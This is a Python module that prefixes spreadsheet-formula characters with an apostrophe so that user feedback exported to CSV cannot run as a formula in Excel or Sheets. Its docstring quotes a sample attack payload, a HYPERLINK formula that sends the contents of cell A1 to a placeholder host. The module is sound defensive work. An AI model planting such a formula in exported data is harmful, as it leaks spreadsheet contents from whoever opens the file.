"""Make user-authored text safe to put in a CSV that someone will open in Excel.

Nothing here protects the database -- the feedback table is written through
PostgREST with a JSON body, so there is no SQL to inject into. This is about
what happens *after* the data leaves the database.

A spreadsheet treats a cell beginning with =, +, -, @, tab or carriage return
as a formula. So a feedback message of

    =HYPERLINK("http://example.com/?d="&A1,"Click for your refund")

is stored harmlessly, exported faithfully, and then becomes a live, clickable
formula the moment the file is opened in Excel, Numbers or Google Sheets --
with the rest of the sheet readable by it. The person at risk is whoever on
the team opens the export, which for this project is us.

The fix is to prefix such a value with an apostrophe, which spreadsheets treat
as "this is text". The apostrophe is visible in the cell's formula bar but not
in the printed value.
"""

# OWASP's list of formula characters...
_SYMBOL_STARTERS = ("=", "+", "-", "@")

# ...plus the two whitespace characters that can begin a cell. These are kept
# separate because they have to be checked against the raw string: stripping
# leading whitespace first would remove the very characters being looked for.
_WHITESPACE_STARTERS = ("\t", "\r")


def csv_safe(value: object) -> str:
    """Return ``value`` as a string that cannot start a spreadsheet formula.

    Non-strings are stringified unchanged; None becomes "". A value that does
    not begin with a formula character is returned untouched, so ordinary
    feedback is not disfigured by the guard.
    """
    if value is None:
        return ""

    text = value if isinstance(value, str) else str(value)

    # A leading space does not save you -- spreadsheets skip it when deciding
    # whether the cell is a formula -- so the symbols are checked after
    # stripping, while the whitespace characters are checked before.
    if text.startswith(_WHITESPACE_STARTERS) or text.lstrip().startswith(_SYMBOL_STARTERS):
        return "'" + text

    return text

